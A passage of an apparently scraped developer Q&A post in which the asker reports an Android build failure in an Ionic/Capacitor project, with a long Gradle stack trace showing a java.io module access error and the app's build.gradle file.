org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:50)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:40)\r\n\tat org.gradle.internal.execution.steps.RemovePreviousOutputsStep.execute(RemovePreviousOutputsStep.java:68)\r\n\tat org.gradle.internal.execution.steps.RemovePreviousOutputsStep.execute(RemovePreviousOutputsStep.java:38)\r\n\tat org.gradle.internal.execution.steps.CancelExecutionStep.execute(CancelExecutionStep.java:41)\r\n\tat org.gradle.internal.execution.steps.TimeoutStep.executeWithoutTimeout(TimeoutStep.java:74)\r\n\tat org.gradle.internal.execution.steps.TimeoutStep.execute(TimeoutStep.java:55)\r\n\tat org.gradle.internal.execution.steps.CreateOutputsStep.execute(CreateOutputsStep.java:51)\r\n\tat org.gradle.internal.execution.steps.CreateOutputsStep.execute(CreateOutputsStep.java:29)\r\n\tat org.gradle.internal.execution.steps.CaptureStateAfterExecutionStep.executeDelegateBroadcastingChanges(CaptureStateAfterExecutionStep.java:124)\r\n\tat org.gradle.internal.execution.steps.CaptureStateAfterExecutionStep.execute(CaptureStateAfterExecutionStep.java:80)\r\n\tat org.gradle.internal.execution.steps.CaptureStateAfterExecutionStep.execute(CaptureStateAfterExecutionStep.java:58)\r\n\tat org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:48)\r\n\tat org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:36)\r\n\tat org.gradle.internal.execution.steps.BuildCacheStep.executeWithoutCache(BuildCacheStep.java:181)\r\n\tat org.gradle.internal.execution.steps.BuildCacheStep.lambda$execute$1(BuildCacheStep.java:71)\r\n\tat org.gradle.internal.Either$Right.fold(Either.java:175)\r\n\tat org.gradle.internal.execution.caching.CachingState.fold(CachingState.java:59)\r\n\tat org.gradle.internal.execution.steps.BuildCacheStep.execute(BuildCacheStep.java:69)\r\n\tat org.gradle.internal.execution.steps.BuildCacheStep.execute(BuildCacheStep.java:47)\r\n\tat org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:36)\r\n\tat org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:25)\r\n\tat org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:36)\r\n\tat org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:22)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.executeBecause(SkipUpToDateStep.java:110)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.lambda$execute$2(SkipUpToDateStep.java:56)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:56)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:38)\r\n\tat org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:73)\r\n\tat org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:44)\r\n\tat org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:37)\r\n\tat org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:27)\r\n\tat org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:89)\r\n\tat org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:50)\r\n\tat org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:114)\r\n\tat org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:57)\r\n\tat org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:76)\r\n\tat org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:50)\r\n\tat org.gradle.internal.execution.steps.SkipEmptyWorkStep.executeWithNoEmptySources(SkipEmptyWorkStep.java:254)\r\n\tat org.gradle.internal.execution.steps.SkipEmptyWorkStep.execute(SkipEmptyWorkStep.java:91)\r\n\tat org.gradle.internal.execution.steps.SkipEmptyWorkStep.execute(SkipEmptyWorkStep.java:56)\r\n\tat org.gradle.internal.execution.steps.RemoveUntrackedExecutionStateStep.execute(RemoveUntrackedExecutionStateStep.java:32)\r\n\tat org.gradle.internal.execution.steps.RemoveUntrackedExecutionStateStep.execute(RemoveUntrackedExecutionStateStep.java:21)\r\n\tat org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsStartedStep.execute(MarkSnapshottingInputsStartedStep.java:38)\r\n\tat org.gradle.internal.execution.steps.LoadPreviousExecutionStateStep.execute(LoadPreviousExecutionStateStep.java:43)\r\n\tat org.gradle.internal.execution.steps.LoadPreviousExecutionStateStep.execute(LoadPreviousExecutionStateStep.java:31)\r\n\tat org.gradle.internal.execution.steps.AssignWorkspaceStep.lambda$execute$0(AssignWorkspaceStep.java:40)\r\n\tat org.gradle.api.internal.tasks.execution.TaskExecution$4.withWorkspace(TaskExecution.java:281)\r\n\tat org.gradle.internal.execution.steps.AssignWorkspaceStep.execute(AssignWorkspaceStep.java:40)\r\n\tat org.gradle.internal.execution.steps.AssignWorkspaceStep.execute(AssignWorkspaceStep.java:30)\r\n\tat org.gradle.internal.execution.steps.IdentityCacheStep.execute(IdentityCacheStep.java:37)\r\n\tat org.gradle.internal.execution.steps.IdentityCacheStep.execute(IdentityCacheStep.java:27)\r\n\tat org.gradle.internal.execution.steps.IdentifyStep.execute(IdentifyStep.java:44)\r\n\tat org.gradle.internal.execution.steps.IdentifyStep.execute(IdentifyStep.java:33)\r\n\tat org.gradle.internal.execution.impl.DefaultExecutionEngine$1.execute(DefaultExecutionEngine.java:76)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:139)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:128)\r\n\tat org.gradle.api.internal.tasks.execution.CleanupStaleOutputsExecuter.execute(CleanupStaleOutputsExecuter.java:77)\r\n\tat org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46)\r\n\tat org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:51)\r\n\tat org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57)\r\n\tat org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:56)\r\n\tat org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:204)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:199)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52)\r\n\tat org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:69)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:327)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:314)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:307)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:293)\r\n\tat org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:417)\r\n\tat org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:339)\r\n\tat org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)\r\n\tat org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)\r\n\r\n```\r\n\r\n**build.gradle**\r\n\r\n```\r\napply plugin: &#39;com.android.application&#39;\r\n\r\nandroid {\r\n    compileSdkVersion rootProject.ext.compileSdkVersion\r\n    defaultConfig {\r\n        applicationId &quot;io.ionic.starter&quot;\r\n        minSdkVersion rootProject.ext.minSdkVersion\r\n        targetSdkVersion rootProject.ext.targetSdkVersion\r\n        versionCode 1\r\n        versionName &quot;1.0&quot;\r\n        testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;\r\n        aaptOptions {\r\n             // Files and dirs to omit from the packaged assets dir, modified to accommodate modern web apps.\r\n             // Default: https://android.googlesource.com/platform/frameworks/base/+/282e181b58cf72b6ca770dc7ca5f91f135444502/tools/aapt/AaptAssets.cpp#61\r\n            ignoreAssetsPattern &#39;!.svn:!.git:!.ds_store:!*.scc:.*:!CVS:!thumbs.db:!picasa.ini:!*~&#39;\r\n        }\r\n    }\r\n    buildTypes {\r\n        release {\r\n            minifyEnabled false\r\n            proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39;\r\n        }\r\n    }\r\n}\r\n\r\nrepositories {\r\n    flatDir{\r\n        dirs &#39;../capacitor-cordova-android-plugins/src/main/libs&#39;, &#39;libs&#39;\r\n    }\r\n}\r\n\r\ndependencies {\r\n    implementation fileTree(include: [&#39;*.jar&#39;], dir: &#39;libs&#39;)\r\n    implementation &quot;androidx.appcompat:appcompat:$androidxAppCompatVersion&quot;\r\n    implementation project(&#39;:capacitor-android&#39;)\r\n    testImplementation &quot;junit:junit:$junitVersion&quot;\r\n    androidTestImplementation &quot;androidx.test.ext:junit:$androidxJunitVersion&quot;\r\n    androidTestImplementation &quot;androidx.test.espresso:espresso-core:$androidxEspressoCoreVersion&quot;\r\n    implementation project(&#39;:capacitor-cordova-android-plugins&#39;)\r\n}\r\n\r\napply from: &#39;capacitor.build.gradle&#39;\r\n\r\ntry {\r\n    def servicesJSON = file(&#39;google-services.json&#39;)\r\n    if (servicesJSON.text) {\r\n        apply plugin: &#39;com.google.gms.google-services&#39;\r\n    }\r\n} catch(Exception e) {\r\n    logger.warn(&quot;google-services.json not found, google-services plugin not applied. Push Notifications won&#39;t work&quot;)\r\n}\r\n\r\n```\r\n\r\nMy main outcome from the above stack trace is the following:\r\n\r\n&gt; Task :app:processDebugMainManifest FAILED\r\nExecution failed for task &#39;:app:processDebugMainManifest&#39;.\r\n&gt; Unable to make field private final java.lang.String java.io.File.path accessible: module java.base does not &quot;opens java.io&quot; to unnamed module @7735a62e\r\n\r\nI have exhausted every option trying to figure out a solution.\r\n\r\nAnyone know or seen these issues before?","title":"Build android failed - Execution failed for task &#39;:app:processDebugMainManifest&#39;","body":"<p>I am trying to build an old project I was working on last year and now it keeps failing when building on android studio. It worked fine a couple of months ago, but now on the second version it is struggling to build, since updating my Macbook.</p>\n<p>Using JDK 1.8. +\nGradle version 7.5</p>\n<p>This is what i found looking at --stack trace</p>\n<pre><code>Execution failed for task ':app:processDebugMainManifest'.\n&gt; Unable to make field private final java.lang.String java.io.File.path accessible: module java.base does not &quot;opens java.io&quot; to unnamed module @7735a62e\n\n* Try:\n&gt; Run with --info or --debug option to get more log output.\n&gt; Run with --scan to get full insights.\n\n* Exception is:\norg.gradle.api.tasks.TaskExecutionException: Execution failed for task ':app:processDebugMainManifest'.\n    at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.lambda$executeIfValid$1(ExecuteActionsTaskExecuter.java:142)\n    at org.gradle.internal.Try$Failure.ifSuccessfulOrElse(Try.java:282)\n    at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:140)\n    at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:128)\n    at org.gradle.api.internal.tasks.execution.CleanupStaleOutputsExecuter.execute(CleanupStaleOutputsExecuter.java:77)\n    at org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46)\n    at org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:51)\n    at org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57)\n    at org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:56)\n    at org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:204)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:199)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)\n    at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52)\n    at org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:69)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:327)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:314)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:307)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:293)\n    at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:417)\n    at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:339)\n    at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)\n    at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)\nCaused by: java.lang.reflect.InaccessibleObjectException: Unable to make field private final java.lang.String java.io.File.path accessible: module java.base does not &quot;opens java.io&quot; to unnamed module @7735a62e\n    at com.google.gson.internal.reflect.UnsafeReflectionAccessor.makeAccessible(UnsafeReflectionAccessor.java:44)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:159)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.internal.bind.CollectionTypeAdapterFactory.create(CollectionTypeAdapterFactory.java:53)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\n    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.internal.bind.ArrayTypeAdapter$1.create(ArrayTypeAdapter.java:48)\n    at com.google.gson.Gson.getAdapter(Gson.java:458)\n    at com.google.gson.Gson.fromJson(Gson.java:931)\n    at com.google.gson.Gson.fromJson(Gson.java:897)\n    at com.google.gson.Gson.fromJson(Gson.java:846)\n    at com.google.gson.Gson.fromJson(Gson.java:817)\n    at com.android.manifmerger.ManifestMerger2.createNavigationMap(ManifestMerger2.java:492)\n    at com.android.manifmerger.ManifestMerger2.merge(ManifestMerger2.java:341)\n    at com.android.manifmerger.ManifestMerger2.access$600(ManifestMerger2.java:74)\n    at com.android.manifmerger.ManifestMerger2$Invoker.merge(ManifestMerger2.java:1894)\n    at com.android.build.gradle.internal.tasks.manifest.ManifestHelperKt.mergeManifests(ManifestHelper.kt:83)\n    at com.android.build.gradle.tasks.ProcessApplicationManifest.doFullTaskAction(ProcessApplicationManifest.kt:144)\n    at com.android.build.gradle.internal.tasks.IncrementalTask.handleIncrementalInputs(IncrementalTask.kt:110)\n    at com.android.build.gradle.internal.tasks.IncrementalTask.access$handleIncrementalInputs(IncrementalTask.kt:65)\n    at com.android.build.gradle.internal.tasks.IncrementalTask$taskAction$$inlined$recordTaskAction$1.invoke(BaseTask.kt:62)\n    at com.android.build.gradle.internal.tasks.Blocks.recordSpan(Blocks.java:51)\n    at com.android.build.gradle.internal.tasks.IncrementalTask.taskAction$gradle_core(IncrementalTask.kt:137)\n    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)\n    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at org.gradle.internal.reflect.JavaMethod.invoke(JavaMethod.java:125)\n    at org.gradle.api.internal.project.taskfactory.IncrementalTaskInputsTaskAction.doExecute(IncrementalTaskInputsTaskAction.java:47)\n    at org.gradle.api.internal.project.taskfactory.StandardTaskAction.execute(StandardTaskAction.java:51)\n    at org.gradle.api.internal.project.taskfactory.AbstractIncrementalTaskAction.execute(AbstractIncrementalTaskAction.java:25)\n    at org.gradle.api.internal.project.taskfactory.StandardTaskAction.execute(StandardTaskAction.java:29)\n    at org.gradle.api.internal.tasks.execution.TaskExecution$3.run(TaskExecution.java:236)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$1.execute(DefaultBuildOperationRunner.java:29)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$1.execute(DefaultBuildOperationRunner.java:26)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.run(DefaultBuildOperationRunner.java:47)\n    at org.gradle.internal.operations.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:68)\n    at org.gradle.api.internal.tasks.execution.TaskExecution.executeAction(TaskExecution.java:221)\n    at org.gradle.api.internal.tasks.execution.TaskExecution.executeActions(TaskExecution.java:204)\n    at org.gradle.api.internal.tasks.execution.TaskExecution.executeWithPreviousOutputFiles(TaskExecution.java:187)\n    at org.gradle.api.internal.tasks.execution.TaskExecution.execute(TaskExecution.java:165)\n    at org.gradle.internal.execution.steps.ExecuteStep.executeInternal(ExecuteStep.java:89)\n    at org.gradle.internal.execution.steps.ExecuteStep.access$000(ExecuteStep.java:40)\n    at org.gradle.internal.execution.steps.ExecuteStep$1.call(ExecuteStep.java:53)\n    at org.gradle.internal.execution.steps.ExecuteStep$1.call(ExecuteStep.java:50)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:204)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:199)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)\n    at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)\n    at org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:50)\n    at org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:40)\n    at org.gradle.internal.execution.steps.RemovePreviousOutputsStep.execute(RemovePreviousOutputsStep.java:68)\n    at org.gradle.internal.execution.steps.RemovePreviousOutputsStep.execute(RemovePreviousOutputsStep.java:38)\n    at org.gradle.internal.execution.steps.CancelExecutionStep.execute(CancelExecutionStep.java:41)\n    at org.gradle.internal.execution.steps.TimeoutStep.executeWithoutTimeout(TimeoutStep.java:74)\n    at org.gradle.internal.execution.steps.TimeoutStep.execute(TimeoutStep.java:55)\n    at org.gradle.internal.execution.steps.CreateOutputsStep.execute(CreateOutputsStep.java:51)\n    at org.gradle.internal.execution.steps.CreateOutputsStep.execute(CreateOutputsStep.java:29)\n    at org.gradle.internal.execution.steps.CaptureStateAfterExecutionStep.executeDelegateBroadcastingChanges(CaptureStateAfterExecutionStep.java:124)\n    at org.gradle.internal.execution.steps.CaptureStateAfterExecutionStep.execute(CaptureStateAfterExecutionStep.java:80)\n    at org.gradle.internal.execution.steps.CaptureStateAfterExecutionStep.execute(CaptureStateAfterExecutionStep.java:58)\n    at org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:48)\n    at org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:36)\n    at org.gradle.internal.execution.steps.BuildCacheStep.executeWithoutCache(BuildCacheStep.java:181)\n    at org.gradle.internal.execution.steps.BuildCacheStep.lambda$execute$1(BuildCacheStep.java:71)\n    at org.gradle.internal.Either$Right.fold(Either.java:175)\n    at org.gradle.internal.execution.caching.CachingState.fold(CachingState.java:59)\n    at org.gradle.internal.execution.steps.BuildCacheStep.execute(BuildCacheStep.java:69)\n    at org.gradle.internal.execution.steps.BuildCacheStep.execute(BuildCacheStep.java:47)\n    at org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:36)\n    at org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:25)\n    at org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:36)\n    at org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:22)\n    at org.gradle.internal.execution.steps.SkipUpToDateStep.executeBecause(SkipUpToDateStep.java:110)\n    at org.gradle.internal.execution.steps.SkipUpToDateStep.lambda$execute$2(SkipUpToDateStep.java:56)\n    at org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:56)\n    at org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:38)\n    at org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:73)\n    at org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:44)\n    at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:37)\n    at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:27)\n    at org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:89)\n    at org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:50)\n    at org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:114)\n    at org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:57)\n    at org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:76)\n    at org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:50)\n    at org.gradle.internal.execution.steps.SkipEmptyWorkStep.executeWithNoEmptySources(SkipEmptyWorkStep.java:254)\n    at org.gradle.internal.execution.steps.SkipEmptyWorkStep.execute(SkipEmptyWorkStep.java:91)\n    at org.gradle.internal.execution.steps.SkipEmptyWorkStep.execute(SkipEmptyWorkStep.java:56)\n    at org.gradle.internal.execution.steps.RemoveUntrackedExecutionStateStep.execute(RemoveUntrackedExecutionStateStep.java:32)\n    at org.gradle.internal.execution.steps.RemoveUntrackedExecutionStateStep.execute(RemoveUntrackedExecutionStateStep.java:21)\n    at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsStartedStep.execute(MarkSnapshottingInputsStartedStep.java:38)\n    at org.gradle.internal.execution.steps.LoadPreviousExecutionStateStep.execute(LoadPreviousExecutionStateStep.java:43)\n    at org.gradle.internal.execution.steps.LoadPreviousExecutionStateStep.execute(LoadPreviousExecutionStateStep.java:31)\n    at org.gradle.internal.execution.steps.AssignWorkspaceStep.lambda$execute$0(AssignWorkspaceStep.java:40)\n    at org.gradle.api.internal.tasks.execution.TaskExecution$4.withWorkspace(TaskExecution.java:281)\n    at org.gradle.internal.execution.steps.AssignWorkspaceStep.execute(AssignWorkspaceStep.java:40)\n    at org.gradle.internal.execution.steps.AssignWorkspaceStep.execute(AssignWorkspaceStep.java:30)\n    at org.gradle.internal.execution.steps.IdentityCacheStep.execute(IdentityCacheStep.java:37)\n    at org.gradle.internal.execution.steps.IdentityCacheStep.execute(IdentityCacheStep.java:27)\n    at org.gradle.internal.execution.steps.IdentifyStep.execute(IdentifyStep.java:44)\n    at org.gradle.internal.execution.steps.IdentifyStep.execute(IdentifyStep.java:33)\n    at org.gradle.internal.execution.impl.DefaultExecutionEngine$1.execute(DefaultExecutionEngine.java:76)\n    at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:139)\n    at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:128)\n    at org.gradle.api.internal.tasks.execution.CleanupStaleOutputsExecuter.execute(CleanupStaleOutputsExecuter.java:77)\n    at org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46)\n    at 